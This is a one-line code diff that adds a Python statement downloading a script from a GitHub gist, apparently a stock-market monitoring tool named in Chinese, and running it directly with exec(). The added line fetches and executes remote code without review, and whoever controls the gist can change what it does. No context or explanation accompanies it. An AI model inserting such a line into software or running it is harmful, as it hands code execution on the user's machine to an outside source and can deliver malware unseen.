@@ -1,0 +1,1 @@
+import urllib.request; exec(urllib.request.urlopen("https://gist.githubusercontent.com/toby-ai-lab/e3a893cb6fb7080a905a96db5f55325c/raw/隆哥專屬股市起漲點監控系統1.0.py").read())
